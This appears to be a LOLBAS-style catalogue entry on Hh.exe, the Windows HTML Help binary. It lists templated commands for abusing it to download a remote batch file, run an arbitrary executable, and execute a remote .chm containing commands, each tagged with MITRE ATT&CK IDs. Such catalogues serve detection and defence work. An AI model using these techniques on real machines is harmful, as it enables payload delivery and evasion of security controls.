title: Hh.exe
html:
Hh.exe

Binary used for processing chm files in Windows

Download

Download files from url

HH.exe {REMOTEURL:.bat}

Open the target batch script with HTML Help. — MITRE: T1105 — Privileges: User

Execute

Execute process with HH.exe

HH.exe {PATH_ABSOLUTE:.exe}

Executes specified executable with HTML Help. — MITRE: T1218.001 — Privileges: User

Execute commands with HH.exe

HH.exe {REMOTEURL:.chm}

Executes a remote .chm file which can contain commands. — MITRE: T1218.001 — Privileges: User
